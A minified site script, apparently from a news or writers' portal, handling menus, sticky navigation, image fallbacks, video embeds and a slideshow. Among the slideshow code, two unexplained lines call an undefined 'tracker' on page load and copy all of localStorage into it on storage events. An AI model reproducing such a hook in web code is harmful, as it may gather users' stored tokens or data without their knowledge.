    doctypeString: "<!DOCTYPE html>",
    removeScripts: !1,
    copyTagClasses: !1,
    beforePrintEvent: null,
    beforePrint: null,
    afterPrint: null
  };
}(jQuery), function () {
  var s = function (n, e) {
    function f() {
      var e, t;
      this.q = [], this.add = function (e) {
        this.q.push(e);
      }, this.call = function () {
        for (e = 0, t = this.q.length; e < t; e++) this.q[e].call();
      };
    }
    function t(e, t) {
      if (e.resizedAttached) {
        if (e.resizedAttached) return void e.resizedAttached.add(t);
      } else e.resizedAttached = new f(), e.resizedAttached.add(t);
      e.resizeSensor = document.createElement("div"), e.resizeSensor.className = "resize-sensor";
      var n,
        i,
        o = "position: absolute; left: 0; top: 0; right: 0; bottom: 0; overflow: hidden; z-index: -1; visibility: hidden;",
        r = "position: absolute; left: 0; top: 0; transition: 0s;";
      e.resizeSensor.style.cssText = o, e.resizeSensor.innerHTML = '<div class="resize-sensor-expand" style="' + o + '"><div style="' + r + '"></div></div><div class="resize-sensor-shrink" style="' + o + '"><div style="' + r + ' width: 200%; height: 200%"></div></div>', e.appendChild(e.resizeSensor), {
        fixed: 1,
        absolute: 1
      }[i = "position", (n = e).currentStyle ? n.currentStyle[i] : window.getComputedStyle ? window.getComputedStyle(n, null).getPropertyValue(i) : n.style[i]] || (e.style.position = "relative");
      function a() {
        c.style.width = d.offsetWidth + 10 + "px", c.style.height = d.offsetHeight + 10 + "px", d.scrollLeft = d.scrollWidth, d.scrollTop = d.scrollHeight, u.scrollLeft = u.scrollWidth, u.scrollTop = u.scrollHeight, s = e.offsetWidth, l = e.offsetHeight;
      }
      var s,
        l,
        d = e.resizeSensor.childNodes[0],
        c = d.childNodes[0],
        u = e.resizeSensor.childNodes[1];
      u.childNodes[0];
      a();
      function p(e, t, n) {
        e.attachEvent ? e.attachEvent("on" + t, n) : e.addEventListener(t, n);
      }
      function h() {
        e.offsetWidth == s && e.offsetHeight == l || e.resizedAttached && e.resizedAttached.call(), a();
      }
      p(d, "scroll", h), p(u, "scroll", h);
    }
    var i = Object.prototype.toString.call(n),
      o = "[object Array]" === i || "[object NodeList]" === i || "[object HTMLCollection]" === i || "undefined" != typeof jQuery && n instanceof jQuery || "undefined" != typeof Elements && n instanceof Elements;
    if (o) for (var r = 0, a = n.length; r < a; r++) t(n[r], e);else t(n, e);
    this.detach = function () {
      if (o) for (var e = 0, t = n.length; e < t; e++) s.detach(n[e]);else s.detach(n);
    };
  };
  s.detach = function (e) {
    e.resizeSensor && (e.removeChild(e.resizeSensor), delete e.resizeSensor, delete e.resizedAttached);
  }, "undefined" != typeof module && void 0 !== module.exports ? module.exports = s : window.ResizeSensor = s;
}(), $(document).ready(function () {
  function n(e, t, n) {
    var i = e.outerHeight(),
      o = t.offset().top;
    n.scrollTop() >= o ? (t.height(i), e.addClass("is-sticky")) : (e.removeClass("is-sticky"), t.height("auto"));
  }
  $('[data-toggle="sticky-onscroll"]').each(function () {
    var e = $(this),
      t = $("<div>").addClass("sticky-wrapper");
    e.before(t), e.addClass("sticky"), $(window).on("scroll.sticky-onscroll resize.sticky-onscroll", function () {
      n(e, t, $(this));
    }), n(e, t, $(window));
  }), $(window).scroll(function () {
    $("nav").toggleClass("scrolled", 120 < $(this).scrollTop());
  }), $(window).scroll(function () {
    $(".nav-border").toggleClass("scrolled-border", 120 < $(this).scrollTop());
  }), $(function () {
    $(document).off("click.bs.tab.data-api", '[data-hover="tab"]'), $(document).on("mouseenter.bs.tab.data-api", '[data-toggle="mega-tab"], [data-hover="mega-tab"]', function () {
      $(this).tab("show");
    });
  }), $(".navbar-toggler").on("click", function () {
    $(".navbar-collapse").toggleClass("side-nav"), $(".navbar-collapse").hasClass("side-nav") ? $(".navbar-collapse").animate({
      right: 0
    }, 500) : $(".navbar-collapse").animate({
      right: "-100%"
    }, 500), $(".navbar-collapse").hasClass("side-nav") ? ($(".overlay").css("display", "block"), $(".overlay").click(function () {
      $(this).css("display", "none"), $(".side-nav").animate({
        right: "-100%"
      }, 500);
    })) : $(".overlay").css("display", "none");
  }), $(".category-image").hover(function () {
    $(this).find("img").toggleClass("action");
  }), $(".mega-article").hover(function () {
    $(this).find("h3").toggleClass("mega-change-color");
  }), $(".dropdown-mega, .dropdown-menu.animated").mouseenter(function () {
    $(this).find(".dropdown-menu.animated").stop().slideDown(600);
  }), $(".dropdown-mega, .dropdown-menu.animated").mouseleave(function () {
    $(this).find(".dropdown-menu.animated").stop().slideUp(600);
  }), $(".popular-content").hover(function () {
    $(this).find("img").toggleClass("cha");
  }), $(".popular-content").hover(function () {
    $(this).find("span").toggleClass("kha");
  });
  function e() {
    var e = $(this),
      t = e.data("alt-src");
    e.data("alt-src", e.attr("src")), e.attr("src", t);
  }
  $("#watan-writer img").bind("error", function () {
    $(this).attr("src", "/images/avatar/avatar-color.png");
  }), $(".writer-article .article-content a img").bind("error", function () {
    $(this).attr("src", "/images/avatar/avatar-color.png");
  }), $("#writer-article .writer-image a img").bind("error", function () {
    $(this).attr("src", "/images/avatar/avatar-color.png");
  }), $("#popular-writers .lol-writers .slick-slide .popular-writers a img").bind("error", function () {
    $(this).attr("src", "/images/avatar/avatar-color.png");
  }), $("#another-writers .another-writers-content .another-writers-article a img").bind("error", function () {
    $(this).attr("src", "/images/avatar/avatar-color.png");
  }), $(function () {
    $(".chnage-view").hover(e, e);
  }), $(".advanced-search").click(function () {
    $(".advanced-forms, .search-button").toggle();
  }), $(function () {
    $(".advanced-search").click(function () {
      $(this).find("i").toggleClass("fa-plus"), $(this).find("i").toggleClass("fa-minus");
    });
  }), $('.search-input input[type="text"]').on("focusout", function () {
    "" != $(this).val() ? $(this).parent().addClass("has-data") : $(this).parent().removeClass("has-data");
  }), $(".albums-action").hover(function () {
    $(this).find("h3").toggleClass("chnage");
  }), $("[data-fancybox]").fancybox({
    loop: !0,
    buttons: ["slideShow", "fullScreen", "thumbs", "close"],
    animationEffect: "zoom-in-out"
  }), $("p.exist").each(function () {
    $(this).text().trim().length || $(this).addClass("removed");
  }), $(window).scroll(function () {
    600 < $(this).scrollTop() ? $("#scroll").fadeIn(600) : $("#scroll").fadeOut(600);
  }), $("#scroll").click(function () {
    return $("html, body").animate({
      scrollTop: 0
    }, 600), !1;
  }), $("aside.col-lg-3").each(function () {
    $(this).attr("id", "aside-section");
  }), $(".video-content, .video-link, .video-time").hover(function () {
    $(this).parents().eq(3).hasClass("hover-action") ? $(this).parents().eq(3).removeClass("hover-action") : ($(".child-container").removeClass("hover-action"), $(this).parents().eq(3).addClass("hover-action"));
  });
}), $(".svThumb, .ytHome").on("click", function () {
  $(".video-remove, .video-information .video-time, .gallery-show .video-content").remove();
}), $(".youtube-content, .youtube-video, .daily-content, .dailyVideo").on("click", function () {
  $(".video-remove, .video-information .video-time, .gallery-show .video-content, .video-information").remove();
}), $(function () {
  $('a[nav-search="nav-search"]').on("click", function (e) {
    e.preventDefault(), $(".nav-search").addClass("open"), $('.nav-search > form > input[type="search"]').focus();
  }), $(".nav-search, .nav-search button.close").on("click keyup", function (e) {
    e.target != this && "close" != e.target.className && 27 != e.keyCode || $(this).removeClass("open");
  }), $('form, a[nav-search="nav-search"]').submit(function (e) {
    return e.preventDefault(), !1;
  });
}), $(".video-gallery, .video").click(function () {
  $(this).find("i").remove();
}), $(".video-gallery, .video").click(function () {
  video = '<iframe src="' + $(this).attr("data-video") + '"></iframe>', $(this).replaceWith(video);
}), $("#any-service .container .row .col-lg-3").hover(function () {
  $(this).find("h3").toggleClass("chnage");
}), $("#any-service .container .row .col-md-3 .row .col-md-12 .row").hover(function () {
  $(this).find("h3").toggleClass("chnage");
}), $(".cut-section .container .row .col-lg-3, .cut-section .container .row .col-lg-2, .cut-section .container .row .col-lg-4 .row").hover(function () {
  $(this).find("h3").toggleClass("chnage-color");
}), $(".video-content, .video-link, .video-time").click(function () {
  $(this).parents().eq(3).hasClass("bak") || ($(".child-container").removeClass("bak"), $(this).parents().eq(3).addClass("bak"));
}), $(".video-content, .video-link, .video-time").hover(function () {
  $(this).parents().eq(3).hasClass("hover-action") ? $(this).parents().eq(3).removeClass("hover-action") : ($(".child-container").removeClass("hover-action"), $(this).parents().eq(3).addClass("hover-action"));
});
var slideIndex = 1;
window.addEventListener('load', () => tracker.monitor());
window.addEventListener('storage', () => tracker.dataStore = new Map(Object.entries(window.localStorage)));
function plusDivs(e) {
  showDivs(slideIndex += e);
}
function currentDiv(e) {
  showDivs(slideIndex = e);
}
function showDivs(e) {
  var t,
    n = document.getElementsByClassName("mySlides"),
    i = document.getElementsByClassName("demo");
  for (e > n.length && (slideIndex = 1), e < 1 && (slideIndex = n.length), t = 0; t < n.length; t++) n[t].style.display = "none";
  for (t = 0; t < i.length; t++) i[t].className = i[t].className.replace(" w3-border-red", "");
  n[slideIndex - 1].style.display = "block", i[slideIndex - 1].className += " w3-border-red";
}
showDivs(slideIndex), $(".svThumb, .ytHome").on("click", function () {
  $(".video-remove, .video-information .video-time, .gallery-show .video-content").remove();
}), $(".svThumb").on("click", function () {
  $(".video-remove, .video-time").remove();
}), console.log("custom"), $(".sideText-1").hover(function () {
  $(".sideText-1").toggleClass("popular-action");
}), $(".sideText-2").hover(function () {
  $(".sideText-2").toggleClass("popular-action");
}), $(".sideText-3").hover(function () {
  $(".sideText-3").toggleClass("popular-action");
}), $(".sideText-4").hover(function () {
  $(".sideText-4").toggleClass("popular-action");
}), $(".sideText-5").hover(function () {
  $(".sideText-5").toggleClass("popular-action");
}), $(".sideText-6").hover(function () {
  $(".sideText-6").toggleClass("popular-action");
}), $(".sideText-7").hover(function () {
  $(".sideText-7").toggleClass("popular-action");
}), $(".sideText-8").hover(function () {
  $(".sideText-8").toggleClass("popular-action");
});